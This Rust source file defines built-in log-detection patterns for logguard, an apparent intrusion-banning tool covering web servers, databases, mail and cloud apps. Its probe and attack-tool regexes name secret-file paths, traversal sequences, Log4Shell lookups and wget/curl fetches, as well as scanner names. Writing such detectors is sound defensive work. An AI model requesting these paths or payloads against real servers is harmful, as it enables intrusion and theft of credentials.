//! Built-in sources for common services (`[sources] apps`): web servers, a load balancer,
//! Prosody, Nextcloud and ownCloud, databases, in-memory stores, mail and logguard's own web console. Each is a set of patterns like the ones of
//! your own (`parse::custom`), written and tested here, so they share everything patterns
//! have: journal lines judged by journald's own fields, log files followed with `tail -F`,
//! the dashboard's Patterns tab, `logguard test-pattern`.
//!
//! ```toml
//! [sources]
//! apps = ["nginx", "postgresql", "redis"]
//!
//! [sources.app_logs]              # only where a log isn't in the usual places
//! nginx_access = ["/srv/www/logs/access.log", "/srv/www/logs/api-access.log"]
//! postgresql = "postgresql@17-main.service"
//!
//! [sources.app_weights]           # points of a built-in pattern, if not the default
//! nginx_limit = 0
//! ```
//!
//! Log lines carry text the client chose (user names, request paths, headers). Every
//! pattern anchors the address it bans to where the service itself writes it: at the start
//! of the line, after fixed fields only the service fills, or at its very end. So a client
//! can't get another address banned by putting it in a name it tries.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use anyhow::{bail, Result};
use serde::{Deserialize, Serialize};

use super::custom::{PatternCfg, PatternKind};

/// A client address as services write it: IPv4, IPv6, IPv4-mapped IPv6.
macro_rules! ip {
    () => {
        "[0-9A-Fa-f.:]+"
    };
}

/// The head of a syslog line in a file rsyslog writes (RFC 3339 or classic time, host, tag);
/// lines from the journal have none.
macro_rules! syslog_head {
    () => {
        r"(?:(?:[A-Z][a-z]{2} +\d+ \d\d:\d\d:\d\d|\S+) \S+ [^\s\[]+\[\d+\]: )?"
    };
}

/// Request targets nobody legitimate asks for: secrets, version control, path traversal,
/// well-known exploits. Not `wp-login.php` and the like: a WordPress site has them.
macro_rules! probe {
    () => {
        r"(?i:/\.env\b|/\.git/|/\.(?:svn|hg|bzr)/|/\.(?:aws|ssh|docker|kube)/|/\.ht(?:passwd|access)\b|/\.ds_store\b|/wp-config\.php|/etc/(?:passwd|shadow)\b|/proc/self/environ|(?:\.|%2e){2}(?:/|%2f|;/)|/vendor/phpunit/|/boaform/|/hnap1\b|/s?ftp-config\.json|/docker-compose\.ya?ml|/\.(?:npmrc|bash_history|vscode/)|/id_(?:rsa|dsa|ecdsa|ed25519)\b|\$\{jndi:|%24%7bjndi|/(?:winnt|windows)/system32/|/(?:root|cmd)\.exe\b|\.ida\?|/_vti_bin/_vti_aut/|awstats\.pl\?configdir=|/gponform/|/cgi-bin/luci\b|(?:wget|curl)(?:\+|%20)+(?:https?|ftp)(?::|%3a))"
    };
}

/// A combined/common access log line (nginx, Apache; Apache's `vhost_combined` starts with
/// `host:port`) up to the request target. The address is the line's first field.
macro_rules! access_head {
    () => {
        concat!(r"^(?:\S+:\d+ )?(?P<ip>", ip!(), r") \S+ .*?\[\d\d/\w{3}/\d{4}:[^\]]+\] ", r#""[A-Za-z]+ [^ "]*?"#)
    };
}

/// The same up to the request's method.
macro_rules! access_start {
    () => {
        concat!(r"^(?:\S+:\d+ )?(?P<ip>", ip!(), r") \S+ .*?\[\d\d/\w{3}/\d{4}:[^\]]+\] ", "\"")
    };
}

/// A request for another site through this one (absolute URL, CONNECT): only clients of a
/// forward proxy send them, and scanners looking for an open one.
macro_rules! proxy_request {
    () => {
        r"(?:CONNECT [^ \x22]+ |[A-Za-z]+ (?i:https?|ftp)://)"
    };
}

/// User agents of attack tools: vulnerability scanners, fuzzers, brute forcers.
macro_rules! attack_tool {
    () => {
        r"(?i:\b(?:nuclei|nikto|sqlmap|dirbuster|gobuster|feroxbuster|ffuf|wfuzz|wpscan|joomscan|droopescan|masscan|zgrab|nmap|jaeles|whatweb|l9scan|l9explore|l9tcpid|tsunami|acunetix|netsparker|openvas|zmeu|morfeus|hydra)\b)"
    };
}

/// User agents of internet-wide survey scanners (they map, they don't attack).
macro_rules! survey_scanner {
    () => {
        r"(?i:\b(?:censysinspect|censys|shodan|internetmeasurement|palo ?alto ?networks|cortex ?xpanse|bitsightbot|modatscanner|genomecrawler|visionheight|leakix)\b)"
    };
}

/// The access log line's last quoted field (combined format: the user agent; a '"' inside
/// one is written `\x22`) holding one of these names.
macro_rules! last_field {
    ($names:expr) => {
        concat!(access_start!(), r#".*"[^"]*"#, $names, r#"[^"]*"\s*$"#)
    };
}

/// nginx's error log: time, level, pid#tid, connection.
macro_rules! nginx_head {
    () => {
        r"^\d{4}/\d\d/\d\d \d\d:\d\d:\d\d \[\w+\] \d+#\d+: \*\d+ "
    };
}

/// Apache's error log up to the client's address: 2.4's default `ErrorLogFormat` (`[module:level]
/// [pid N:tid N] [client 1.2.3.4:5678]`), or 2.2's (`[level] [client 1.2.3.4]`). The shortest
/// address the rest fits: the port is the last `:digits`.
macro_rules! apache_head {
    () => {
        concat!(r"^\[[^\]]+\] \[(?:[a-z_]+:)?\w+\] (?:\[pid \d+(?::tid \d+)?\] )?\[client \[?(?P<ip>[0-9A-Fa-f.:]+?)\]?(?::\d+)?\] ")
    };
}

/// HAProxy's log (`option httplog`, `option tcplog`, TLS errors): client address and the
/// accept date.
macro_rules! haproxy_head {
    () => {
        concat!("^", syslog_head!(), "(?P<ip>", ip!(), r"):\d+ \[\d\d/\w{3}/\d{4}:\d\d:\d\d:\d\d(?:\.\d+)?\] ")
    };
}

/// MySQL's and MariaDB's error log: time (one or two fields), thread, level, and MySQL 8's
/// error code and subsystem.
macro_rules! mysql_head {
    () => {
        r"^\S+(?: \S+)? (?:\d+ )?\[\w+\] (?:\[MY-\d+\] \[\w+\] )?"
    };
}

/// PostgreSQL with `log_line_prefix = '%m [%p] %h '` (`%r` too): time with zone, pid, client.
macro_rules! pg_head {
    () => {
        concat!(r"^\d{4}-\d\d-\d\d \d\d:\d\d:\d\d(?:\.\d+)? \S+ \[\d+\] (?P<ip>", ip!(), r")(?:\(\d+\))? ")
    };
}

/// MongoDB's structured log (4.4 and later): an `ACCESS` entry, up to its message.
macro_rules! mongo_head {
    () => {
        r#"^\{"t":\{"\$date":"[^"]+"\},\s*"s":"\w+",\s*"c":"ACCESS",\s*"id":\d+,\s*"ctx":"[^"]*",\s*"#
    };
}

/// Redis' and Valkey's log line: pid:role, time, level (absent when they log to syslog).
macro_rules! redis_head {
    () => {
        r"^(?:\d+:[A-Z] \d+ \w{3} \d{4} \d\d:\d\d:\d\d\.\d+ [.\-*#] )?"
    };
}

/// A host name as Postfix writes it before the address (`unknown[203.0.113.5]`): checked
/// by Postfix, so no brackets.
macro_rules! postfix_client {
    () => {
        concat!(r"[-._0-9A-Za-z]+\[(?P<ip>", ip!(), r")\]")
    };
}

/// A line of nextcloud.log or ownCloud 10's owncloud.log (JSON), up to its message. The
/// address is the line's own `remoteAddr`: a quote inside a JSON value is escaped, so no
/// value (a user name, a URL) can hold a field of its own.
macro_rules! cloud_head {
    () => {
        concat!(r#"^\{"reqId":"[^"]*",\s*"level":\d+,\s*"time":"[^"]*",\s*"remoteAddr":"(?P<ip>"#, ip!(), r#")",.*?"message":""#)
    };
}

/// One built-in pattern.
pub struct Rule {
    pub name: &'static str,
    pub kind: PatternKind,
    pub weight: f64,
    pub port: Option<u16>,
    pub regex: &'static str,
}

/// One log of an app, and where it usually is.
pub struct Stream {
    /// Its key in `[sources.app_logs]`.
    pub id: &'static str,
    pub about: &'static str,
    /// Log files, in the usual places; `*` in a file name stands for any text. All that
    /// exist are followed.
    pub files: &'static [&'static str],
    /// Its unit's journal, when there are no files (the first unit installed).
    pub units: &'static [&'static str],
    /// The journal before files: they're written by syslog, where any local user can log
    /// lines in the service's name, while journald names the real sender.
    pub prefer_journal: bool,
    pub rules: &'static [Rule],
}

pub struct App {
    pub name: &'static str,
    pub about: &'static str,
    pub streams: &'static [Stream],
}

const fn rule(name: &'static str, kind: PatternKind, weight: f64, port: Option<u16>, regex: &'static str) -> Rule {
    Rule { name, kind, weight, port, regex }
}

use PatternKind::{Failure, Probe};

pub const APPS: &[App] = &[
    App {
        name: "apache",
        about: "Apache httpd",
        streams: &[
            Stream {
                id: "apache_access",
                about: "access log",
                files: &[
                    "/var/log/apache2/*access.log",
                    "/var/log/httpd/*access_log",
                    "/var/snap/nextcloud/current/logs/apache_access.log",
                ],
                units: &[],
                prefer_journal: false,
                rules: &[
                    rule("apache_probe", Probe, 40.0, Some(443), concat!(access_head!(), probe!())),
                    rule("apache_proxy", Probe, 20.0, Some(443), concat!(access_start!(), proxy_request!())),
                    rule("apache_scanner", Probe, 40.0, Some(443), last_field!(attack_tool!())),
                    rule("apache_survey", Probe, 20.0, Some(443), last_field!(survey_scanner!())),
                ],
            },
            Stream {
                id: "apache_error",
                about: "error log",
                files: &["/var/log/apache2/*error.log", "/var/log/httpd/*error_log", "/var/snap/nextcloud/current/logs/apache_errors.log"],
                units: &[],
                prefer_journal: false,
                rules: &[
                    // AH01617 wrong password, AH01618 unknown user (a Basic user name has no ':')
                    rule(
                        "apache_auth",
                        Failure,
                        25.0,
                        Some(443),
                        concat!(apache_head!(), r#"(?:AH0161[78]: )?user (?P<user>[^:]*?)(?:: authentication failure for "| not found: )"#),
                    ),
                    rule("apache_traversal", Probe, 40.0, Some(443), concat!(apache_head!(), r"AH10244: invalid URI path")),
                    // requests no browser sends (2.2 has no AH codes)
                    rule(
                        "apache_badreq",
                        Probe,
                        10.0,
                        Some(443),
                        concat!(
                            apache_head!(),
                            r"(?:AH\d{5}: )?(?:Invalid method in request|request failed: (?:URI too long|erroneous characters after protocol string)|",
                            r"client sent HTTP/1\.1 request without hostname)"
                        ),
                    ),
                    // `Require` refused the request (it may be a rule of your own: fewer points).
                    // Not "Directory index forbidden": that's a visitor at a folder without index.
                    rule(
                        "apache_denied",
                        Probe,
                        20.0,
                        Some(443),
                        concat!(apache_head!(), r"(?:AH0(?:1630|1797): )?client denied by server configuration: "),
                    ),
                ],
            },
        ],
    },
    App {
        name: "nginx",
        about: "nginx",
        streams: &[
            Stream {
                id: "nginx_access",
                about: "access log",
                files: &["/var/log/nginx/*access.log"],
                units: &[],
                prefer_journal: false,
                rules: &[
                    rule("nginx_probe", Probe, 40.0, Some(443), concat!(access_head!(), probe!())),
                    rule("nginx_proxy", Probe, 20.0, Some(443), concat!(access_start!(), proxy_request!())),
                    rule("nginx_scanner", Probe, 40.0, Some(443), last_field!(attack_tool!())),
                    rule("nginx_survey", Probe, 20.0, Some(443), last_field!(survey_scanner!())),
                ],
            },
            Stream {
                id: "nginx_error",
                about: "error log",
                files: &["/var/log/nginx/*error.log"],
                units: &[],
                prefer_journal: false,
                rules: &[
                    // auth_basic; a Basic user name has no ':', so it can't hold a ", client: "
                    rule(
                        "nginx_auth",
                        Failure,
                        25.0,
                        Some(443),
                        concat!(
                            nginx_head!(),
                            r#"user "(?P<user>[^:]*?)"(?:: password mismatch| was not found in "[^"]*"), client: (?P<ip>"#,
                            ip!(),
                            "), server: "
                        ),
                    ),
                    rule(
                        "nginx_denied",
                        Probe,
                        20.0,
                        Some(443),
                        concat!(nginx_head!(), "access forbidden by rule, client: (?P<ip>", ip!(), "),"),
                    ),
                    // limit_req / limit_conn rejections: busy clients too, so few points
                    rule(
                        "nginx_limit",
                        Probe,
                        8.0,
                        Some(443),
                        concat!(
                            nginx_head!(),
                            r#"limiting (?:requests, excess: [\d.]+|connections) by zone "[^"]*", client: (?P<ip>"#,
                            ip!(),
                            "),"
                        ),
                    ),
                ],
            },
        ],
    },
    App {
        name: "haproxy",
        about: "HAProxy",
        streams: &[Stream {
            id: "haproxy",
            about: "log",
            files: &["/var/log/haproxy.log"],
            units: &["haproxy.service"],
            prefer_journal: false,
            rules: &[
                // captured headers can't hold a '"' (HAProxy writes #22), so the first one
                // opens the request
                rule("haproxy_probe", Probe, 40.0, None, concat!(haproxy_head!(), r#"[^"]*"[A-Za-z]+ [^ "]*?"#, probe!())),
                // termination state P (HAProxy refused: http-request deny, tarpit, bad request)
                rule("haproxy_denied", Probe, 20.0, None, concat!(haproxy_head!(), r"\S+ \S+ \S+ \d{3} \d+ \S+ \S+ P[RT]")),
                rule(
                    "haproxy_tls",
                    Probe,
                    10.0,
                    None,
                    concat!(
                        haproxy_head!(),
                        r"\S+: (?:SSL handshake failure|Connection closed during SSL handshake|Timeout during SSL handshake)"
                    ),
                ),
            ],
        }],
    },
    App {
        name: "prosody",
        about: "Prosody (XMPP), with mod_log_auth",
        streams: &[Stream {
            id: "prosody",
            about: "log",
            files: &["/var/log/prosody/prosody.log"],
            units: &["prosody.service"],
            prefer_journal: false,
            // mod_log_auth's message right after the source and level (its file's `source\tlevel\t`,
            // the console's padded ones, syslog's `source: `), so a client's text logged
            // elsewhere in a line (a stream error's) can't end in one; and the address ends the
            // line: nothing the client sends comes after it
            rules: &[rule(
                "prosody_auth",
                Failure,
                25.0,
                Some(5222),
                concat!(
                    "^",
                    syslog_head!(),
                    r"(?:[A-Z][a-z]{2} +\d+ \d\d:\d\d:\d\d )?\S+(?:\s+(?:debug|info|warn|error)\s+|: )",
                    r"Failed authentication attempt \([^)]*\) for user (?P<user>\S+) from IP: (?P<ip>",
                    ip!(),
                    r")\s*$"
                ),
            )],
        }],
    },
    App {
        name: "mysql",
        about: "MySQL, MariaDB, Percona Server",
        streams: &[Stream {
            id: "mysql",
            about: "error log",
            files: &["/var/log/mysql/error.log", "/var/log/mysqld.log", "/var/log/mariadb/mariadb.log", "/var/log/mysql/mysqld.log"],
            units: &["mariadb.service", "mysql.service", "mysqld.service"],
            prefer_journal: false,
            rules: &[
                // the user name may hold anything: the last '@'host' before the end is the server's
                rule(
                    "mysql_auth",
                    Failure,
                    25.0,
                    Some(3306),
                    concat!(
                        mysql_head!(),
                        r"Access denied for user '(?P<user>.*)'@'(?P<ip>",
                        ip!(),
                        r")' \(using password: (?:YES|NO)\)\s*$"
                    ),
                ),
                rule(
                    "mysql_preauth",
                    Probe,
                    8.0,
                    Some(3306),
                    concat!(
                        mysql_head!(),
                        r"Aborted connection \d+ to db: 'unconnected' user: 'unauthenticated' host: '(?P<ip>",
                        ip!(),
                        r")' \("
                    ),
                ),
            ],
        }],
    },
    App {
        name: "postgresql",
        about: "PostgreSQL, with %h in log_line_prefix",
        streams: &[Stream {
            id: "postgresql",
            about: "log",
            files: &["/var/log/postgresql/postgresql-*.log", "/var/lib/pgsql/data/log/postgresql-*.log"],
            units: &["postgresql.service"],
            prefer_journal: false,
            rules: &[
                rule(
                    "postgresql_auth",
                    Failure,
                    25.0,
                    Some(5432),
                    concat!(pg_head!(), r#".*?FATAL: +password authentication failed for user "(?P<user>.*)"\s*$"#),
                ),
                rule(
                    "postgresql_role",
                    Failure,
                    25.0,
                    Some(5432),
                    concat!(pg_head!(), r#".*?FATAL: +role "(?P<user>.*)" does not exist\s*$"#),
                ),
                rule("postgresql_hba", Probe, 25.0, Some(5432), concat!(pg_head!(), r#".*?FATAL: +no pg_hba\.conf entry for host ""#)),
                rule(
                    "postgresql_preauth",
                    Probe,
                    8.0,
                    Some(5432),
                    concat!(
                        pg_head!(),
                        r".*?(?:LOG|FATAL): +(?:invalid length of startup packet|incomplete startup packet|unsupported frontend protocol|",
                        r"no PostgreSQL user name specified in startup packet|invalid startup packet layout|could not accept SSL connection)"
                    ),
                ),
            ],
        }],
    },
    App {
        name: "mongodb",
        about: "MongoDB 4.4 and later",
        streams: &[Stream {
            id: "mongodb",
            about: "log",
            files: &["/var/log/mongodb/mongod.log"],
            units: &["mongod.service"],
            prefer_journal: false,
            // JSON: a quote inside a value is escaped, so no value can hold a "remote":"
            rules: &[
                rule(
                    "mongodb_auth",
                    Failure,
                    25.0,
                    Some(27017),
                    concat!(
                        mongo_head!(),
                        r#""msg":"Authentication failed","attr":\{.*?"principalName":"(?P<user>(?:[^"\\]|\\.)*)",.*?"remote":"\[?(?P<ip>"#,
                        ip!(),
                        r#")\]?:\d+""#
                    ),
                ),
                rule(
                    "mongodb_auth_v6",
                    Failure,
                    25.0,
                    Some(27017),
                    concat!(
                        mongo_head!(),
                        r#""msg":"Failed to authenticate","attr":\{"client":"\[?(?P<ip>"#,
                        ip!(),
                        r#")\]?:\d+",.*?"user":"(?P<user>(?:[^"\\]|\\.)*)""#
                    ),
                ),
            ],
        }],
    },
    App {
        name: "redis",
        about: "Redis, Valkey, KeyDB",
        streams: &[Stream {
            id: "redis",
            about: "log",
            files: &[
                "/var/log/redis/redis-server.log",
                "/var/log/redis/redis.log",
                "/var/log/valkey/valkey-server.log",
                "/var/log/valkey/valkey.log",
                "/var/log/keydb/keydb-server.log",
            ],
            units: &["redis-server.service", "redis.service", "valkey-server.service", "valkey.service", "keydb-server.service"],
            prefer_journal: false,
            rules: &[
                // HTTP sent to the Redis port (cross-protocol scripting): only scanners do that
                rule(
                    "redis_attack",
                    Probe,
                    40.0,
                    Some(6379),
                    concat!(redis_head!(), r"Possible SECURITY ATTACK detected\. .*Connection from (?P<ip>", ip!(), r"):\d+ aborted\.\s*$"),
                ),
                rule(
                    "redis_tls",
                    Probe,
                    10.0,
                    Some(6379),
                    concat!(redis_head!(), r"Error accepting a client connection: .*\(addr=\[?(?P<ip>", ip!(), r")\]?:\d+ laddr="),
                ),
            ],
        }],
    },
    App {
        name: "nextcloud",
        about: "Nextcloud without AIO (packages, the snap, your own web server)",
        streams: &[Stream {
            id: "nextcloud",
            about: "log (nextcloud.log)",
            files: &[
                "/var/www/nextcloud/data/nextcloud.log",
                "/var/www/html/nextcloud/data/nextcloud.log",
                "/var/www/html/data/nextcloud.log",
                "/srv/nextcloud/data/nextcloud.log",
                "/var/snap/nextcloud/current/logs/nextcloud.log",
                "/var/log/nextcloud/nextcloud.log",
                "/var/log/nextcloud.log",
            ],
            units: &[],
            prefer_journal: false,
            rules: &[
                // "Login failed: alice (Remote IP: 1.2.3.4)", older "'alice' (Remote IP: '1.2.3.4')"
                rule(
                    "nextcloud_auth",
                    Failure,
                    25.0,
                    Some(443),
                    concat!(cloud_head!(), r#"Login failed: (?P<user>(?:[^"\\]|\\.)*?) \(Remote IP: "#),
                ),
                // its own brute-force protection slowing an address down (loglevel 1 and below)
                rule("nextcloud_bruteforce", Probe, 40.0, Some(443), concat!(cloud_head!(), r#"Bruteforce attempt from \\""#)),
            ],
        }],
    },
    App {
        name: "owncloud",
        about: "ownCloud 10",
        streams: &[Stream {
            id: "owncloud",
            about: "log (owncloud.log)",
            files: &[
                "/var/www/owncloud/data/owncloud.log",
                "/var/www/html/owncloud/data/owncloud.log",
                "/var/www/html/data/owncloud.log",
                "/mnt/data/files/owncloud.log",
                "/var/log/owncloud/owncloud.log",
            ],
            units: &[],
            prefer_journal: false,
            rules: &[rule(
                "owncloud_auth",
                Failure,
                25.0,
                Some(443),
                concat!(cloud_head!(), r#"Login failed: (?P<user>(?:[^"\\]|\\.)*?) \(Remote IP: "#),
            )],
        }],
    },
    App {
        name: "postfix",
        about: "Postfix",
        streams: &[Stream {
            id: "postfix",
            about: "log",
            files: &["/var/log/mail.log", "/var/log/maillog"],
            units: &["postfix@-.service", "postfix.service"],
            prefer_journal: true,
            rules: &[
                rule(
                    "postfix_sasl",
                    Failure,
                    25.0,
                    None,
                    concat!(
                        "^",
                        syslog_head!(),
                        "warning: ",
                        postfix_client!(),
                        r": SASL [-\w]+ authentication failed(?:: [^,]*)?(?:, sasl_username=(?P<user>\S+))?"
                    ),
                ),
                rule(
                    "postfix_relay",
                    Probe,
                    25.0,
                    Some(25),
                    concat!("^", syslog_head!(), r"NOQUEUE: reject: RCPT from ", postfix_client!(), r": 554 5\.7\.1 .*Relay access denied"),
                ),
            ],
        }],
    },
    App {
        name: "dovecot",
        about: "Dovecot (IMAP, POP3)",
        streams: &[Stream {
            id: "dovecot",
            about: "log",
            files: &["/var/log/mail.log", "/var/log/maillog", "/var/log/dovecot.log"],
            units: &["dovecot.service"],
            prefer_journal: true,
            // the last rip= is Dovecot's: the user name comes before it
            rules: &[rule(
                "dovecot_auth",
                Failure,
                25.0,
                None,
                concat!(
                    "^",
                    syslog_head!(),
                    r"(?:imap|pop3|managesieve|submission)-login: .*\(auth failed, \d+ attempts? in \d+ secs?\).*: user=<(?P<user>[^>]*)>.*, rip=(?P<ip>",
                    ip!(),
                    "), lip="
                ),
            )],
        }],
    },
    App {
        name: "logguard-web",
        about: "logguard-web (the web console)",
        streams: &[Stream {
            id: "logguard_web",
            about: "log",
            files: &[],
            units: &["logguard-web.service"],
            prefer_journal: true,
            // logguard-web writes the client's address (from the connection) right after fixed
            // text; what the client chose (a path) only comes after it
            rules: &[
                // the console's login: a password and a one-time code; also the attempts
                // refused while the address is locked out
                rule("logguard_web_login", Failure, 25.0, None, concat!(r"^login (?:failed|refused) from (?P<ip>", ip!(), "): ")),
                rule(
                    "logguard_web_probe",
                    Probe,
                    40.0,
                    None,
                    concat!(r"^console: unknown path from (?P<ip>", ip!(), r"): [A-Z]+ \S*?", probe!()),
                ),
                // an address outside CONSOLE_ALLOW or AGENT_ALLOW, and a request to an agent
                // without the web key
                rule(
                    "logguard_web_refused",
                    Probe,
                    20.0,
                    None,
                    concat!(r"^(?:console|agent): refused connection from (?P<ip>", ip!(), r"): not in [A-Z_]+$"),
                ),
                rule("logguard_web_agent", Probe, 20.0, None, concat!(r"^agent: rejected request from (?P<ip>", ip!(), "): ")),
            ],
        }],
    },
];

pub fn app(name: &str) -> Option<&'static App> {
    APPS.iter().find(|a| a.name == name)
}

/// The app and log of a key of `[sources.app_logs]` (`nginx_access`).
pub fn stream(id: &str) -> Option<(&'static App, &'static Stream)> {
    APPS.iter().find_map(|a| a.streams.iter().find(|s| s.id == id).map(|s| (a, s)))
}

fn names() -> String {
    APPS.iter().map(|a| a.name).collect::<Vec<_>>().join(", ")
}

/// Every built-in pattern's name, for checks against the patterns of your own.
pub fn rule_names() -> impl Iterator<Item = (&'static str, &'static str)> {
    APPS.iter().flat_map(|a| a.streams.iter().flat_map(move |s| s.rules.iter().map(move |r| (r.name, a.name))))
}

/// `[sources.app_logs]` entry: one file, several, or a systemd unit (its journal).
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Logs {
    One(String),
    Many(Vec<String>),
}

impl Logs {
    fn list(&self) -> Vec<&str> {
        match self {
            Logs::One(s) => vec![s.as_str()],
            Logs::Many(v) => v.iter().map(String::as_str).collect(),
        }
    }
}

/// What the expansion looks at on this host: which log files exist, which units are installed.
pub trait Host {
    /// The existing files a path names (`*` in its file name stands for any text), sorted.
    fn files(&self, path: &str) -> Vec<PathBuf>;
    fn unit_installed(&self, unit: &str) -> bool;
}

/// The real host.
pub struct System;

/// Most files one log path may name (each is followed by a `tail` of its own).
const MAX_FILES: usize = 16;

impl Host for System {
    fn files(&self, path: &str) -> Vec<PathBuf> {
        let p = Path::new(path);
        let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
        let Some((pre, post)) = name.split_once('*') else {
            return if p.is_file() { vec![p.to_path_buf()] } else { vec![] };
        };
        let Some(dir) = p.parent() else { return vec![] };
        let Ok(rd) = std::fs::read_dir(dir) else { return vec![] };
        let mut out: Vec<PathBuf> = rd
            .flatten()
            .filter(|e| {
                let n = e.file_name();
                let n = n.to_string_lossy();
                n.len() >= pre.len() + post.len() && n.starts_with(pre) && n.ends_with(post)
            })
            .map(|e| e.path())
            .filter(|p| p.is_file())
            .collect();
        out.sort();
        out
    }

    fn unit_installed(&self, unit: &str) -> bool {
        // an instance (`postfix@-.service`) is installed with its template (`postfix@.service`)
        let file = match unit.split_once('@') {
            Some((name, rest)) => format!("{name}@.{}", rest.rsplit_once('.').map_or("", |(_, ext)| ext)),
            None => unit.to_string(),
        };
        ["/etc/systemd/system", "/run/systemd/system", "/usr/lib/systemd/system", "/lib/systemd/system"]
            .iter()
            .any(|d| Path::new(d).join(&file).exists())
    }
}

/// Where a log's lines come from.
#[derive(Clone, Debug, PartialEq)]
enum Place {
    Files(Vec<PathBuf>),
    Unit(String),
}

fn unit_ok(s: &str) -> bool {
    [".service", ".scope"].iter().any(|ext| s.len() > ext.len() && s.ends_with(ext))
        && s.len() <= 256
        && !s.chars().any(|c| c.is_whitespace() || c.is_control() || matches!(c, '+' | '=' | '/'))
}

fn place(stream: &Stream, logs: Option<&Logs>, host: &dyn Host) -> Result<Place> {
    let id = stream.id;
    if let Some(logs) = logs {
        let list = logs.list();
        return match list.as_slice() {
            [] => bail!("[sources.app_logs] {id}: name a log file or a systemd unit"),
            [unit] if !unit.starts_with('/') => {
                if !unit_ok(unit) {
                    bail!("[sources.app_logs] {id}: '{unit}' is neither an absolute path nor a unit name (e.g. \"mariadb.service\")");
                }
                Ok(Place::Unit(unit.to_string()))
            }
            paths => {
                if let Some(p) = paths.iter().find(|p| !p.starts_with('/')) {
                    bail!("[sources.app_logs] {id}: '{p}' must be an absolute path (or the only entry, a unit name)");
                }
                if let Some(p) = paths.iter().find(|p| Path::new(p).parent().is_some_and(|d| d.to_string_lossy().contains('*'))) {
                    bail!("[sources.app_logs] {id}: '{p}': '*' only in the file name");
                }
                let mut files = BTreeSet::new();
                for p in paths {
                    let found = host.files(p);
                    // a file that isn't there yet is followed once it appears (`tail -F`)
                    if found.is_empty() && !p.contains('*') {
                        files.insert(PathBuf::from(p));
                    }
                    files.extend(found);
                }
                if files.is_empty() {
                    bail!("[sources.app_logs] {id}: no file matches {}", paths.join(", "));
                }
                Ok(Place::Files(files.into_iter().take(MAX_FILES).collect()))
            }
        };
    }
    let unit = stream.units.iter().find(|u| host.unit_installed(u));
    if let (true, Some(u)) = (stream.prefer_journal, unit) {
        return Ok(Place::Unit(u.to_string()));
    }
    let files: BTreeSet<PathBuf> = stream.files.iter().flat_map(|f| host.files(f)).collect();
    if !files.is_empty() {
        return Ok(Place::Files(files.into_iter().take(MAX_FILES).collect()));
    }
    Ok(match (unit, stream.units.first(), stream.files.first()) {
        (Some(u), _, _) | (None, Some(u), _) => Place::Unit(u.to_string()),
        // nothing there yet: the first usual file, once it appears
        (None, None, Some(f)) => Place::Files(vec![PathBuf::from(f.replace('*', ""))]),
        (None, None, None) => bail!("{id}: no log"),
    })
}

/// The built-in patterns of the apps in `[sources] apps`, where their logs are on this host,
/// and one line per log saying where that is (for the daemon's start).
pub fn expand(src: &crate::config::SourcesCfg, host: &dyn Host) -> Result<(Vec<PatternCfg>, Vec<String>)> {
    if src.nextcloud_aio && src.apps.iter().any(|a| a == "nextcloud") {
        bail!(
            "[sources]: nextcloud_aio = true (see [nextcloud_aio]) and apps \"nextcloud\" read the same failed logins: \
             keep one (apps for a Nextcloud without AIO)"
        );
    }
    let mut chosen: Vec<&App> = Vec::new();
    for name in &src.apps {
        let Some(a) = app(name) else { bail!("[sources] apps: unknown app '{name}' (built in: {})", names()) };
        if chosen.iter().any(|c| c.name == a.name) {
            bail!("[sources] apps: '{name}' is named twice");
        }
        chosen.push(a);
    }
    for key in src.app_logs.keys() {
        let Some(owner) = APPS.iter().find(|a| a.streams.iter().any(|s| s.id == key)) else {
            let ids: Vec<&str> = APPS.iter().flat_map(|a| a.streams.iter().map(|s| s.id)).collect();
            bail!("[sources.app_logs]: unknown log '{key}' (these are: {})", ids.join(", "));
        };
        if !chosen.iter().any(|c| c.name == owner.name) {
            bail!("[sources.app_logs] {key}: '{}' isn't in [sources] apps", owner.name);
        }
    }
    for (name, w) in &src.app_weights {
        match rule_names().find(|(r, _)| r == name) {
            None => bail!("[sources.app_weights]: unknown built-in pattern '{name}'"),
            Some((_, a)) if !chosen.iter().any(|c| c.name == a) => bail!("[sources.app_weights] {name}: '{a}' isn't in [sources] apps"),
            _ if !w.is_finite() || !(0.0..=1000.0).contains(w) => bail!("[sources.app_weights] {name}: points must be within 0 and 1000"),
            _ => {}
        }
    }
    let (mut patterns, mut said) = (Vec::new(), Vec::new());
    for a in chosen {
        for s in a.streams {
            let place = place(s, src.app_logs.get(s.id), host)?;
            let (file, extra_files, unit) = match &place {
                Place::Files(f) => (f.first().cloned(), f[1..].to_vec(), String::new()),
                Place::Unit(u) => (None, vec![], u.clone()),
            };
            said.push(match &place {
                Place::Files(f) => {
                    let list: Vec<String> = f.iter().map(|p| p.display().to_string()).collect();
                    format!("{} {}: {}", a.about, s.about, list.join(", "))
                }
                Place::Unit(u) => format!("{} {}: journal of {u}", a.about, s.about),
            });
            for r in s.rules {
                patterns.push(PatternCfg {
                    name: r.name.to_string(),
                    unit: unit.clone(),
                    identifier: String::new(),
                    uid: None,
                    file: file.clone(),
                    extra_files: extra_files.clone(),
                    regex: r.regex.to_string(),
                    kind: r.kind,
                    weight: src.app_weights.get(r.name).copied().unwrap_or(r.weight),
                    port: r.port,
                });
            }
        }
    }
    Ok((patterns, said))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{Event, Signal};
    use crate::record::{Record, Sender, Source};

    /// A host with these files and units installed.
    struct Fake(&'static [&'static str], &'static [&'static str]);

    impl Host for Fake {
        fn files(&self, path: &str) -> Vec<PathBuf> {
            let (pre, post) = path.split_once('*').unwrap_or((path, ""));
            let mut v: Vec<PathBuf> = self
                .0
                .iter()
                .filter(|f| {
                    if path.contains('*') {
                        f.starts_with(pre) && f.ends_with(post) && !f[pre.len()..].contains('/')
                    } else {
                        **f == path
                    }
                })
                .map(PathBuf::from)
                .collect();
            v.sort();
            v
        }

        fn unit_installed(&self, unit: &str) -> bool {
            self.1.contains(&unit)
        }
    }

    fn sources(toml: &str) -> crate::config::SourcesCfg {
        toml::from_str(toml).unwrap()
    }

    /// The event the app's patterns make of a line from its log (None: no event).
    fn hit(app_name: &str, line: &str) -> Option<Event> {
        let (pats, _) = expand(&sources(&format!("apps = [\"{app_name}\"]")), &Fake(&[], &[])).unwrap();
        let p = super::super::custom::Patterns::new(&pats);
        let mut out = vec![];
        // each line as it arrives from wherever its pattern reads
        for c in &pats {
            let sender = match &c.file {
                Some(f) => Sender { file: Some(f.display().to_string()), ..Default::default() },
